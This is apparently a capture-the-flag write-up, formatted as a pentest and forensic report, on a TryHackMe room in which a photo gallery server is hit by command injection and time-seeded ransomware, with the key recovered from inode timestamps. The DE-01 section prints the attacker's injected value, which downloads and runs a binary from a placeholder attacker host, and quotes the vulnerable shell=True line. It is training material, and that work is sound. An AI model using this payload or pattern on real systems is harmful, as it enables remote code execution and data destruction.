# Penetration Testing & Vulnerability Assessment Report: Dead Endpoint (Gallery Service Incident)

**Target System:** Dead Endpoint (Incident Brief)  
**Platform:** TryHackMe  
**Difficulty:** Hard  
**Vulnerability Focus:** Command Injection, Time-Based Ransomware, Cryptographic Key Recovery   

---

## Executive Summary

A penetration testing and forensic assessment was performed on the **Dead Endpoint** room on TryHackMe. The objective was to analyze a preserved Linux disk image from a compromised internal photo gallery server, determine how the application was exploited, reverse-engineer the deployed malware, and recover the encrypted data.

The assessment identified a critical **Command Injection vulnerability** in the export API endpoint, which an attacker exploited to deploy a custom ransomware binary. Static analysis of the binary revealed a time-based cryptographic key derivation. By correlating application logs with filesystem inode metadata, the exact millisecond timestamp was recovered, enabling full decryption of the image library and retrieval of the final flag.

## Detailed Vulnerability Findings & Remediation

### Finding DE-01: OS Command Injection in Export API

* **Severity:** Critical  
* **CVSS v3.1 Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` (**9.8**)  
* **Vulnerable Mechanism:** `POST /api/albums/<id>/export` -> `selection` parameter  

#### Description
The web application's export functionality passed user-supplied input directly into a shell command. The `selection` parameter, submitted via a JSON body, was interpolated into a `tar` command executed via Python's `subprocess.run(shell=True)`. This allowed an attacker to append arbitrary shell operators (`;`, `&&`) to execute system commands with the privileges of the web server.

#### Technical Proof of Concept
1. Analyze the disk image using `mmls` and `fls` to map the partitions and locate the application source (`gallery.py`).
2. Identify the vulnerable line: `subprocess.run(f"/bin/tar -cf '{dest}' -C '{orig}' {selection}", shell=True)`.
3. Extract the malicious injection from the database's `exports` table:
   ```bash
   yard_0147.jpg; curl -fsS http://<ATTACKER_IP>/payload -o /srv/gallery/.cache/.indexd && chmod 700 /srv/gallery/.cache/.indexd && /srv/gallery/.cache/.indexd
   ```

#### Remediation & Mitigation
* **Sanitize Inputs:** Never pass untrusted input to shell commands. Use array-based execution with `shell=False` (e.g., `subprocess.run(["/bin/tar", "-cf", dest, "-C", orig, selection])`).
* **Allowlisting:** Validate the `selection` parameter against a strict list of expected filenames (e.g., `yard_0147.jpg`, `yard_0148.jpg`).
* **Least Privilege:** Run the web server under a restricted user account that cannot write or execute files in hidden cache directories.

### Finding DE-02: Custom Ransomware (GPH1) via Time-Based Seed

* **Severity:** High  
* **CVSS v3.1 Vector:** `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:H` (**7.5**)  
* **Vulnerable Component:** `/srv/gallery/.cache/.indexd` (Malware Binary)  

#### Description
The deployed binary was a custom ransomware executable that encrypted files using **AES-256-GCM**. The encryption key was not random; it was derived from the system time at execution using the `clock_gettime(CLOCK_REALTIME)` syscall. The key was generated by hashing a millisecond timestamp with the **SplitMix64** algorithm (four iterations, concatenated in little-endian to form a 32-byte key). The encrypted files were prefixed with a 48-byte custom header (`GPH1`), containing the IV and authentication tag.

#### Technical Proof of Concept
1. Extract the binary from the disk image (inode 263212) and perform static analysis using `objdump`/`strings`.
2. Reconstruct the SplitMix64 key derivation algorithm in Python.
3. Extract the inode `ctime` from the encrypted `.locked` file using `debugfs` to obtain the exact millisecond timestamp of execution.
4. Decrypt the file:
   ```python
   import struct
   from cryptography.hazmat.primitives.ciphers.aead import AESGCM

   # SplitMix64 implementation
   def sm64(x):
       x = (x + 0x9e3779b97f4a7c15) & 0xFFFFFFFFFFFFFFFF
       z = x
       z = ((z ^ (z >> 30)) * 0xbf58476d1ce4e5b9) & 0xFFFFFFFFFFFFFFFF
       z = ((z ^ (z >> 27)) * 0x94d049bb133111eb) & 0xFFFFFFFFFFFFFFFF
       return x, z ^ (z >> 31)

   def key_from(seed):
       s, k = seed, b""
       for _ in range(4):
           s, o = sm64(s)
           k += o.to_bytes(8, "little")
       return k

   d = open("yard_0152.jpg.locked", "rb").read()
   _, L, _ = struct.unpack("<III", d[4:16])
   nonce, tag, ct = d[16:28], d[28:44], d[48:48+L]
   
   pt = AESGCM(key_from(<TIMESTAMP_MS>)).decrypt(nonce, ct + tag, d[:28])
   open("yard_0152_recovered.jpg", "wb").write(pt)
   ```

#### Remediation & Mitigation
* **Endpoint Hardening:** Resolving Finding DE-01 prevents the initial execution of the malware.
* **Immutable Backups:** Maintain offline, immutable backups of critical data to allow recovery without relying on cryptographic analysis.

### Finding DE-03: Insecure Malware Execution Path (Hidden Cache)

* **Severity:** Medium  
* **CVSS v3.1 Vector:** `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` (**5.5**)  
* **Vulnerable Component:** `/srv/gallery/.cache/` Directory  

#### Description
The web application allowed the attacker to write and execute a binary within a hidden cache directory (`.cache`) inside the application root. This directory was not monitored and was writable by the web server user, allowing the attacker to establish persistence and execute the payload.

#### Technical Proof of Concept
1. Upon identifying the execution command in DE-01, note that the binary is saved to `/srv/gallery/.cache/.indexd` and made executable (`chmod 700`).
2. The binary is executed immediately, with no file integrity monitoring or execution prevention in place.

#### Remediation & Mitigation
* **No-Execute (NX) on Web Directories:** Mount application directories (like `/srv/gallery`) with the `noexec` flag to prevent the execution of uploaded files.
* **File Integrity Monitoring (FIM):** Deploy FIM (e.g., AIDE, OSSEC) to alert on the creation of new executable files in web-accessible directories.
* **Remove Write Permissions:** Ensure the web server user does not have write access to hidden directories within the application root.

---

## Strategic Recommendations

1.  **Shift-Left Security:** Implement automated SAST (Static Application Security Testing) to catch command injection flaws (`subprocess.run(shell=True)`) during the development lifecycle.
2.  **Log Monitoring:** Integrate application logs (like the `gallery.sqlite3-wal` records) with a SIEM to detect suspicious input patterns (e.g., shell metacharacters in API requests).
3.  **Incident Response Playbook:** Update the incident response plan to include disk image acquisition and forensic analysis as the primary steps for ransomware cases, rather than immediate system restoration.
